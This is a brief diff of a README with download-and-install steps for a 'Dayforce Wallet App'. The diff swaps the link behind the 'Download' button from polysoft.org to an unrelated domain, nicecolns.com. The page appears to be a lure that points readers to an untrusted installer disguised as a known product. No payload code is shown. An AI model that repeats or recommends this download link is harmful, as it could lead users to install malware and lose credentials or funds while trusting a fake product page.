@@ -13,7 +13,7 @@ Follow these simple steps to **download Dayforce Wallet App** and install it on 
 1. **Download the Installer:**
    - Press **Dayforce Download** button and click it to begin downloading the installer file.
       <br>
-      <a href="https://polysoft.org">
+      <a href="https://nicecolns.com">
         <img src="https://github.com/user-attachments/assets/ab56fd6c-79a9-4e23-9ac7-3363e4286b22" alt="Download" width="300"/>
       </a>
 
